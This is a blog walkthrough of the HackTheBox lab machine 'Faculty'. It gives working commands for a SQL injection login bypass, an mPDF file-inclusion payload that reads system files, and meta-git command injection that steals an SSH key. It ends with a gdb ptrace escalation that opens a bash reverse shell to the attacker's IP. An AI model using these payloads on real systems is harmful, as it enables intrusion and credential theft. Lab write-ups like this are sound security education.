---
title: "Walk-through of Faculty from HackTheBox"
header:
  teaser: /assets/images/2022-07-17-22-44-34.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - mPDF
  - PDFDetach
  - Meta-Git
  - Cap_sys_ptrace
---

[Faculty](https://www.hackthebox.com/home/machines/profile/480) is a medium level machine by [gbyolo](https://www.hackthebox.com/home/users/profile/36994) on [HackTheBox](https://www.hackthebox.com/home). This Linux box focuses on vulnerabilities in a web app and software used by it.

<!--more-->

## Machine Information

![faculty](/assets/images/2022-07-17-22-44-34.png)

We start with an authentication bypass using SQLi to gain access to a scheduling system. Inside we find an old version of mPDF is in use, which we exploit to achieve local file inclusion and read sensitive files on the box. Eventually this leads us to SSH access as a low level user. A simple RCE allows us to retrieve the SSH private key of another user. Logged in as them we use insecure capabilities applied to gdb to get a root shell.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Faculty](https://www.hackthebox.com/home/machines/profile/480) |
| Machine Release Date | 2nd July 2022 |
| Date I Completed It | 20th July 2022 |
| Distribution Used | Kali 2022.2 – [Release Info](https://www.kali.org/blog/kali-linux-2022-2-release/) |

## Initial Recon

As always let's start with Nmap:

```sh
┌──(root㉿kali)-[~]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.169 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root㉿kali)-[~]
└─# nmap -p$ports -sC -sV -oA faculty 10.10.11.169
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 23:03 BST
Nmap scan report for 10.10.11.169
Host is up (0.031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://faculty.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We only have two open ports on this box. There's a redirect to a DNS name so let's add that to our hosts file:

```sh
┌──(root㉿kali)-[~]
└─# echo "10.10.11.169 faculty.htb" >> /etc/hosts
 ```

Now we can look at the website:

![faculty-in-number](/assets/images/2022-07-18-23-13-15.png)

## Feroxbuster

We don't have a Faculty ID, let's have a look for subfolders with Feroxbuster:

```sh
┌──(root㉿kali)-[~]
└─# feroxbuster -u http://faculty.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://faculty.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       12w      178c http://faculty.htb/admin => http://faculty.htb/admin/
302      GET      359l      693w        0c http://faculty.htb/ => login.php
301      GET        7l       12w      178c http://faculty.htb/mpdf => http://faculty.htb/mpdf/
301      GET        7l       12w      178c http://faculty.htb/mpdf/qrcode => http://faculty.htb/mpdf/qrcode/
```

We see a couple of interesting folders. Admin an obvious starting point, and mpdf which I've not seen before.

## SQLi Bypass

Admin takes us to a login page which we can bypass with a simple SQL injection:

![faculty-sqli](/assets/images/2022-07-18-23-21-52.png)

We are inside the scheduling system:

![faculty-dashboard](/assets/images/2022-07-18-23-31-43.png)

## mPDF

Looking around there's sections for courses, subjects and staff. Each section has a PDF button to download the data:

![faculty-subject-list](/assets/images/2022-07-18-23-37-22.png)

Clicking the PDF button downloads the file:

![faculty-pdf-download](/assets/images/2022-07-18-23-39-00.png)

Looking at the PDF properties we see the version of mPDF used was 6.0. Let's have a look in Burp when we download the PDF that gets generated:

![faculty-burp](/assets/images/2022-07-18-23-52-43.png)

## Decoding mPDF String

We can see a long string which is bas64 encoded, let's decode:

```sh
┌──(root㉿kali)-[~/htb/faculty]
└─# echo "JTI1M0NoMSUyNTNFJTI1M0NhJTJCbmFtZSUyNTNEJTI1MjJ0b3AlMjUyMiUyNTNFJTI <SNIP> UzRSUyNTNDJTI1MkZ0YWJsZSUyNTNF" | base64 -d
%253Ch1%253E%253Ca%2Bname%253D%2522top%2522%253E%253C%252Fa%253Efaculty.htb%253C%252Fh1%253E%253Ch2%253<SNIP>Ftboby%253E%253C%252Ftable%253E
```

The output from that is URL encoded, let's decode:

```sh
┌──(root㉿kali)-[~/htb/faculty]
└─# python3 -c "import urllib.parse; print(urllib.parse.unquote('%253Ch1%253E%253Ca%2Bname%253D%2522top%2522%253E%253C%252Fa%253Efaculty.htb%253C%252Fh1%253E%253Ch2%253ESubjects%253C%252Fh2%253E%253Ctable%253E%2509%25<SNIP>53C%252Ftboby%253E%253C%252Ftable%253E'))"
%3Ch1%3E%3Ca+name%3D%22top%22%3E%3C%2Fa%3Efaculty.htb%3C%2Fh1%3E%3Ch2%3ESubjects%3C%2Fh2%3E%3Ctable%3E%09%3Cthead%3E%09%09%3Ctr%3E%09%09%09%3Cth+class%3D%22text-center%22%3E%23%3C%2Fth%3E%09%09%09%3Cth+class%3D%22text-left%22%3ESubject%3C%2Fth%3E%09%09%09%3Cth+class%3D%22text-left%22%3EDescription%3C%2Fth%3E%09%09%09%3C%2Ftr%3E%3C%2Fthead%3E%3Ctbody%3E%3Ctr%3E%3Ctd+class%3D%22text-center%22%3E1%3C%2Ftd%3E%3Ctd
<SNIP>
```

The output from that is also URL encoded, let's decode:

```sh
┌──(root㉿kali)-[~/htb/faculty]
└─# python3 -c "import urllib.parse; print(urllib.parse.unquote('%3Ch1%3E%3Ca+name%3D%22top%22%3E%3C%2Fa%3Efaculty.htb%3C%2Fh1%3E%3Ch2%3ESubjects%3C%2Fh2%3E%3Ctable%3E%09%3Cthead%3E%09%09%3Ctr%3E%09%09%09%3Cth+class%3D%22text-center%22%3E%23%3C%2Fth%3E%09%09%09%3Cth+class%3D%22text-left%22%3ESubject%3C%2Fth%3E%09%09%09%3Cth<SNIP>3C%2Ftable%3E'))" 
<h1><a+name="top"></a>faculty.htb</h1><h2>Subjects</h2><table>  <thead>         <tr>                    <th+class="text-center">#</th>                  <th+class="text-left">Subject</th>                      <th+class="text-left">Description</th>                     </tr></thead><tbody><tr><td+class="text-center">1</td><td+class="text-center"><b>DBMS</b></td><td+class="text-center"><small><b>Database+Management+System</b></small></td></tr><tr><td+class="text-center">2</td><td+class="text-center"><b>Mathematics</b></td><td+class="text-center"><small><b>Mathematics</b></small></td></tr><tr><td+class="text-center">3</td><td+class="text-center"><b>English</b></td><td+class="text-center"><small><b>English</b></small></td></tr><tr><td+class="text-center">4</td><td+class="text-center"><b>Computer+Hardware</b></td><td+class="text-center"><small><b>Computer+Hardware</b></small></td></tr><tr><td+class="text-center">5</td><td+class="text-center"><b>History</b></td><td+class="text-center"><small><b>History</b></small></td></tr></tboby></table>
```

We end up with HTML, if we open that in Firefox we can see its the same contents as the PDF that gets generated:

![faculty-html-output](/assets/images/2022-07-19-22-56-18.png)

So we can intercept the POST request in Burp and replace the PDF string with something of our own choosing.

## Local File Inclusion

Searching around I found [this](https://stackoverflow.com/questions/52072279/adding-attachment-to-pdf-file-with-php-or-using-bash), which says in version 6.0 you can attach files by using the Annotation() function. It gives this example of attaching a file:

```sh
$mpdf->Annotation("File annotation", 0, 0, 'Note', '', '', 0, false, '', 'assets/tiger.jpg');
```

The mPDF docs [here](https://mpdf.github.io/reference/mpdf-functions/annotation.html) also show how to use the Annotation function with files. Looking on the GitHub repo for mPDF I found [this](https://github.com/mpdf/mpdf/issues/356) issue with an example of retrieving the passwd file:

```sh
<annotation file="/etc/passwd" content="/etc/passwd"  icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

Let's try it. We need to URL encode and then base64 encode, just like we did in reverse above:

```sh
┌──(root㉿kali)-[~/htb/faculty]
└─# python3 -c "import urllib.parse; print(urllib.parse.quote('<annotation file=\"/etc/passwd\" content=\"/etc/passwd\" icon=\"Graph\" title=\"Attached File: /etc/passwd\" pos-x=\"195\" />'))" | base64
JTNDYW5ub3RhdGlvbiUyMGZpbGUlM0QlMjIvZXRjL3Bhc3N3ZCUyMiUyMGNvbnRlbnQlM0QlMjIvZXRjL3Bhc3N3ZCUyMiUyMGljb24lM0QlMjJHcmFwaCUyMiUyMHRpdGxlJTNEJTIyQXR0YWNoZWQlMjBGaWxlJTNBJTIwL2V0Yy9wYXNzd2QlMjIlMjBwb3MteCUzRCUyMjE5NSUyMiUyMC8lM0UK
```

Here I've used Python to URL encode the example from above, then it gets base64 encoded. Now we need to log in to the Faculty site using our SQLi bypass:

```sh
┌──(root㉿kali)-[~/htb/faculty]
└─# curl -i -s -k -X POST -b 'PHPSESSID=8fpk0ldu1vns710k2eafmsf3s6' --data-binary $'username=pencer\'+or+1%3D1%23&password=' 'http://faculty.htb/admin/ajax.php?action=login'
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 20 Jul 2022 15:59:58 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

1
```

We have a logged in session so we can send our base64 encoded payload from above:

```sh
┌──(root㉿kali)-[~]
└─# curl -i -s -k -X POST -b 'PHPSESSID=8fpk0ldu1vns710k2eafmsf3s6' --data-binary 'pdf=JTNDYW5ub3RhdGlvbiUyMGZpbGUlM0QlMjIvZXRjL3Bhc3N3ZCUyMiUyMGNvbnRlbnQlM0QlMjIvZXRjL3Bhc3N3ZCUyMiUyMGljb24lM0QlMjJHcmFwaCUyMiUyMHRpdGxlJTNEJTIyQXR0YWNoZWQlMjBGaWxlJTNBJTIwL2V0Yy9wYXNzd2QlMjIlMjBwb3MteCUzRCUyMjE5NSUyMiUyMC8lM0UK' 'http://faculty.htb/admin/download.php' -o -
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 20 Jul 2022 16:03:08 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive

OK3RloLOTaYzJH4fv2SkD8pxWy.pdf
```

We have the pdf filename so let's grab it before it gets removed:

```sh
┌──(root㉿kali)-[~]
└─# wget http://faculty.htb/mpdf/tmp/OK3RloLOTaYzJH4fv2SkD8pxWy.pdf
--2022-07-20 17:04:20--  http://faculty.htb/mpdf/tmp/OK3RloLOTaYzJH4fv2SkD8pxWy.pdf
Resolving faculty.htb (faculty.htb)... 10.10.11.169
Connecting to faculty.htb (faculty.htb)|10.10.11.169|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2576 (2.5K) [application/pdf]
Saving to: ‘OK3RloLOTaYzJH4fv2SkD8pxWy.pdf’
OK3RloLOTaYzJH4fv2SkD8pxWy.pdf    100%[==============>]   2.52K  --.-KB/s    in 0s      
2022-07-20 17:04:20 (380 MB/s) - ‘OK3RloLOTaYzJH4fv2SkD8pxWy.pdf’ saved [2576/2576]
```

## PDFDetach

We can use pdfdetach to get the attachment and then view it:

```sh
┌──(root㉿kali)-[~]
└─# pdfdetach -list OK3RloLOTaYzJH4fv2SkD8pxWy.pdf 
1 embedded files
1: passwd

┌──(root㉿kali)-[~]
└─# pdfdetach -save 1 OK3RloLOTaYzJH4fv2SkD8pxWy.pdf

┌──(root㉿kali)-[~/htb/faculty]
└─# cat passwd | grep "bash"
root:x:0:0:root:/root:/bin/bash
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
developer:x:1001:1002:,,,:/home/developer:/bin/bash
```

I repeated the above to look at default nginx configuration files but didn't get very far. Back to the website, I created a new faculty member here:

![faculty-new-member](/assets/images/2022-07-20-22-44-25.png)

On the Schedule page I can view mine:

![faculty-view-schedule](/assets/images/2022-07-20-22-46-38.png)

## Exploiting faculty_id

If I capture that request to view my schedule in Burp we see there is a faculty_id:

```text
POST /admin/ajax.php?action=get_schecdule HTTP/1.1
Host: faculty.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 12
Origin: http://faculty.htb
Connection: close
Referer: http://faculty.htb/admin/index.php?page=schedule
Cookie: PHPSESSID=8fpk0ldu1vns710k2eafmsf3s6

faculty_id=6
```

If I try that from a terminal with curl the response isn't helpful:

```sh
┌──(root㉿kali)-[~/htb/faculty]
└─# curl -X $'POST' -b $'PHPSESSID=8fpk0ldu1vns710k2eafmsf3s6' --data-binary $'faculty_id=6' $'http://faculty.htb/admin/ajax.php?action=get_schecdule' 
[]
```

If I change the faculty_id to text it causes a fatal error:

```sh
┌──(root㉿kali)-[~/htb/faculty]
└─# curl -X $'POST' -b $'PHPSESSID=8fpk0ldu1vns710k2eafmsf3s6' --data-binary $'faculty_id=pencer' $'http://faculty.htb/admin/ajax.php?action=get_schecdule'
<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/scheduling/admin/admin_class.php:370
Stack trace:
#0 /var/www/scheduling/admin/ajax.php(100): Action-&gt;get_schecdule()
#1 {main}
  thrown in <b>/var/www/scheduling/admin/admin_class.php</b> on line <b>370</b><br />
```

This has revealed the path to the website root. Let's grab that admin_class.php file, first here's our new payload:

```sh
<annotation file="/var/www/scheduling/admin/admin_class.php" content="/var/www/scheduling/admin/admin_class.php"  icon="Graph" title="Attached File: /var/www/scheduling/admin/admin_class.php" pos-x="195" />
```

Like before URL encode then base64 encode that payload then send to the server with curl. Retrieve the pdf, extract the attachment, and we can review that source code:

```sh
┌──(root㉿kali)-[~/htb/faculty]
└─# python3 -c "import urllib.parse; print(urllib.parse.quote('<annotation file=\"/var/www/scheduling/admin/admin_class.php\" content=\"/var/www/scheduling/admin/admin_class.php\"  icon=\"Graph\" title=\"Attached File: /var/www/scheduling/admin/admin_class.php\" pos-x=\"195\" />'))" | base64
JTNDYW5ub3RhdGlvbiUyMGZpbGUlM0QlMjIvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2FkbWluX2NsYXNzLnBocCUyMiUyMGNvbnRlbnQlM0QlMjIvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2FkbWluX2NsYXNzLnBocCUyMiUyMCUyMGljb24lM0QlMjJHcmFwaCUyMiUyMHRpdGxlJTNEJTIyQXR0YWNoZWQlMjBGaWxlJTNBJTIwL3Zhci93d3cvc2NoZWR1bGluZy9hZG1pbi9hZG1pbl9jbGFzcy5waHAlMjIlMjBwb3MteCUzRCUyMjE5NSUyMiUyMC8lM0UK

┌──(root㉿kali)-[~/htb/faculty]
└─# curl -i -s -k -X POST -b 'PHPSESSID=8fpk0ldu1vns710k2eafmsf3s6' --data-binary 'pdf=JTNDYW5ub3RhdGlvbiUyMGZpbGUlM0QlMjIvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2FkbWluX2NsYXNzLnBocCUyMiUyMGNvbnRlbnQlM0QlMjIvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2FkbWluX2NsYXNzLnBocCUyMiUyMCUyMGljb24lM0QlMjJHcmFwaCUyMiUyMHRpdGxlJTNEJTIyQXR0YWNoZWQlMjBGaWxlJTNBJTIwL3Zhci93d3cvc2NoZWR1bGluZy9hZG1pbi9hZG1pbl9jbGFzcy5waHAlMjIlMjBwb3MteCUzRCUyMjE5NSUyMiUyMC8lM0UK' 'http://faculty.htb/admin/download.php' -o -
OK3gSkwW7JXl5vjqdHeQU4hAsP.pdf

┌──(root㉿kali)-[~/htb/faculty]
└─# wget http://faculty.htb/mpdf/tmp/OK3gSkwW7JXl5vjqdHeQU4hAsP.pdf
--2022-07-20 23:01:20--  http://faculty.htb/mpdf/tmp/OK3gSkwW7JXl5vjqdHeQU4hAsP.pdf
Resolving faculty.htb (faculty.htb)... 10.10.11.169
Connecting to faculty.htb (faculty.htb)|10.10.11.169|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4400 (4.3K) [application/pdf]
Saving to: ‘OK3gSkwW7JXl5vjqdHeQU4hAsP.pdf’
OK3gSkwW7JXl5vjqdHeQU4hAsP.pdf   100%[================>]   4.30K  --.-KB/s    in 0s
2022-07-20 23:01:20 (413 MB/s) - ‘OK3gSkwW7JXl5vjqdHeQU4hAsP.pdf’ saved [4400/4400]

┌──(root㉿kali)-[~/htb/faculty]
└─# pdfdetach -save 1 OK3gSkwW7JXl5vjqdHeQU4hAsP.pdf
```

## Code Review

We see another interesting file in here:

```php
┌──(root㉿kali)-[~/htb/faculty]
└─# cat admin_class.php
<?php
session_start();
ini_set('display_errors', 1);
Class Action {
        private $db;

        public function __construct() {
                ob_start();
        include 'db_connect.php';
```

The db_connect.php file surely has something useful. Repeat the above process to get the file, and now we can look at it:

```php
┌──(root㉿kali)-[~/htb/faculty]
└─# cat db_connect.php
<?php
$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
```

## User Access

We have a password, and if you try it with the gbyolo user we found earlier we have SSH access:

```sh
┌──(root㉿kali)-[~/htb/faculty]
└─# ssh gbyolo@10.10.11.169     
gbyolo@10.10.11.169s password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

  System information as of Thu Jul 21 00:11:23 CEST 2022

You have mail.
Last login: Wed Jul 20 21:33:39 2022 from 10.10.14.152
gbyolo@faculty:~$ 
```

We have mail:

```sh
gbyolo@faculty:~$ mail
"/var/mail/gbyolo": 6 messages 5 new 1 unread
 U   1 developer@faculty. Tue Nov 10 15:03  16/623   Faculty group
>N   2 developer@faculty. Wed Jul 20 15:40  12/434   Output from your job        1
 N   3 developer@faculty. Wed Jul 20 15:41  12/434   Output from your job        2
 N   4 developer@faculty. Wed Jul 20 15:41  12/434   Output from your job        3
 N   5 developer@faculty. Wed Jul 20 15:42  12/394   Output from your job        4
 N   6 developer@faculty. Wed Jul 20 15:42  12/394   Output from your job        5
? 1
Return-Path: <developer@faculty.htb>
X-Original-To: gbyolo@faculty.htb
Delivered-To: gbyolo@faculty.htb
Received: by faculty.htb (Postfix, from userid 1001)
        id 0399E26125A; Tue, 10 Nov 2020 15:03:02 +0100 (CET)
Subject: Faculty group
To: <gbyolo@faculty.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20201110140302.0399E26125A@faculty.htb>
Date: Tue, 10 Nov 2020 15:03:02 +0100 (CET)
From: developer@faculty.htb
X-IMAPbase: 1605016995 2
Status: O
X-UID: 1

Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and if you have troubles just let me know!\ndeveloper@faculty.htb
```

## Meta-Git

Interesting. Next we can check sudo permissions:

```sh
-bash-5.0$ sudo -l
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```

I haven't used meta-git before, looking on GitHub we see it's description:

```text
Manage your meta repo and child git repositories.
git plugin for meta.
```

## Meta-Git RCE

A search for **meta-git exploit** finds [this](https://snyk.io/advisor/npm-package/meta-git#security) on Synk.io which leads us to [this](https://hackerone.com/reports/728040) on hackerone. We have a simple RCE exploit which we can combine with sudo permissions to execute as the developer user.

For instance we can look in the developer home folder with this:

```sh
sudo -u developer /usr/local/bin/meta-git clone 'pencer | ls -lsa ~'
```

Except it doesn't work if we are still in the gbyolo users home folder:

```sh
-bash-5.0$ pwd
/home/gbyolo
-bash-5.0$ sudo -u developer /usr/local/bin/meta-git clone 'pencer | ls -lsa ~'
meta git cloning into 'pencer | ls -lsa ~' at pencer | ls -lsa ~
pencer | ls -lsa ~: command 'git clone pencer | ls -lsa ~ pencer | ls -lsa ~' exited with error: Error: spawnSync /bin/sh EACCES
(node:45847) UnhandledPromiseRejectionWarning: Error: EACCES: permission denied, chdir '/home/gbyolo/pencer | ls -lsa ~'
```

So first move to /dev/shm then try again:

```sh
-bash-5.0$ sudo -u developer /usr/local/bin/meta-git clone 'pencer | ls -lsa ~'
<SNIP>
   4 drwxr-xr-x 2 developer developer    4096 Jun 23 18:50 .ssh
   8 -rw------- 1 developer developer    7220 Jul 21 20:27 .viminfo
   4 -rwxrwxr-x 1 developer developer      65 Jul 21 20:27 sendmail.sh
   4 -rw-r----- 1 root      developer      33 Jul 21 10:56 user.txt
```

We see the user flag and a .ssh folder, let's get the SSH private key so we can log in as the developer user:

```sh
-bash-5.0$ sudo -u developer /usr/local/bin/meta-git clone 'pencer | cat ~/.ssh/id_rsa'
<SNIP>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxDAgrHcD2I4U329//sdapn4ncVzRYZxACC/czxmSO5Us2S87dxyw
izZ0hDszHyk+bCB5B1wvrtmAFu2KN4aGCoAJMNGmVocBnIkSczGp/zBy0pVK6H7g6GMAVS
<SNIP>
```

## SSH Access As Developer

Copy that to a file on Kali, remember to chmod 600 then use it to log in as developer:

```sh
┌──(root㉿kali)-[~/htb/faculty]
└─# ssh -i id_rsa developer@10.10.11.169
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

  System information as of Thu Jul 21 23:20:16 CEST 2022

Last login: Thu Jul 21 23:20:08 2022 from 10.10.14.207
-bash-5.0$ 
```

## User Flag

Let's grab the user flag:

```sh
-bash-5.0$ cat user.txt 
889d845e4045c5cf146df52a896e6df0
```

## Cap_sys_ptrace

The path to root is actually really simple. You would have found this using [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), which is our usual go to method of looking for things that are out of the ordinary. I found it by looking at capabilities:

```sh
-bash-5.0$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/gdb = cap_sys_ptrace+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

We can see gdb has the cap_sys_ptrace capability, which is covered by HackTricks [here](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace). All we need is a process running as root. We can then attach gdb to it and make it call the system function as root.

First find processes running as root:

```sh
-bash-5.0$ ps aux | grep "^root*"
root           1  0.0  0.5 170284 11528 ?        Ss   10:56   0:28 /sbin/init maybe-ubiquity
root           2  0.0  0.0      0     0 ?        S    10:56   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   10:56   0:00 [rcu_gp]
<SNIP>
root         668  0.0  0.3  99896  6008 ?        Ssl  10:56   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         687  0.0  0.4 238080  9176 ?        Ssl  10:56   0:01 /usr/lib/accountsservice/accounts-daemon
root         696  0.0  0.1  81956  3756 ?        Ssl  10:56   0:02 /usr/sbin/irqbalance --foreground
root         699  0.0  0.9  26896 18224 ?        Ss   10:56   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         701  0.0  0.4 236436  9292 ?        Ssl  10:56   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         707  0.0  0.3  17500  7796 ?        Ss   10:56   0:00 /lib/systemd/systemd-logind
root         708  0.0  0.6 395512 13720 ?        Ssl  10:56   0:00 /usr/lib/udisks2/udisksd
root         740  0.0  0.6 245084 13340 ?        Ssl  10:56   0:00 /usr/sbin/ModemManager
```

Through trial and error I found the process running python3 worked. So attach gdb to it:

```sh
-bash-5.0$ gdb -p 699
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
<SNIP>
(No debugging symbols found in /lib/x86_64-linux-gnu/libgpg-error.so.0)
Reading symbols from /usr/lib/python3/dist-packages/_dbus_glib_bindings.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3/dist-packages/_dbus_glib_bindings.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /usr/lib/python3.8/lib-dynload/_bz2.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_bz2.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /lib/x86_64-linux-gnu/libbz2.so.1.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libbz2.so.1.0)
Reading symbols from /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so)
0x00007f0a7964d967 in __GI___poll (fds=0x25d9a60, nfds=3, timeout=-1) at ../sysdeps/unix/sysv/linux/poll.c:29
29      ../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
(gdb)
```

Make sure you have netcat listening on Kali then use the system function to use bash to connect to it:

```sh
(gdb) call (void)system("/usr/bin/bash -c '/usr/bin/bash -i >& /dev/tcp/10.10.14.207/1234 0>&1'")
[Detaching after vfork from child process 47309]
```

## Root Flag

Switch to Kali to see we are now root:

```sh
┌──(root㉿kali)-[~/htb/faculty]
└─# nc -nlvp 1234                                     
listening on [any] 1234 ...
connect to [10.10.14.207] from (UNKNOWN) [10.10.11.169] 55016
root@faculty:/#
```

Let's grab the root flag to finish the box:

```sh
root@faculty:/# cat /root/root.txt
f7a31c417625801904d8647f3db34466

root@faculty:/# cat /etc/shadow | grep root
root:$6$CiEa.wxtUKxG5q21$ED3MTE6ehz0j0q4kRQfK4bnLQFLZDrG9skIPsc0p2/X3JSBHFWjRWAZwEdUpqON6UqZOXvme7.1wHzNCVHqk9/:18559:0:99999:7:::
```

And that's another box done. I hope you enjoyed my walkthrough and maybe learned something along the way. See you next time.
